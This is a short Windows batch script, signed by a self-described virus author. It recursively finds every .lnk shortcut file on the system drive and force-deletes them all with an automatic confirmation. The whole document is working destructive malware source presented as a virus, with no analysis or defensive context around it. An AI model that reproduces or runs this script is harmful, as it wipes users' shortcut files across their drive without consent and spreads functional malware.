@ echo off

rem ---------------------------------
rem Delete All Lnk
DIR /S/B %SystemDrive%\*.lnk >> FIleList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_lnk.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__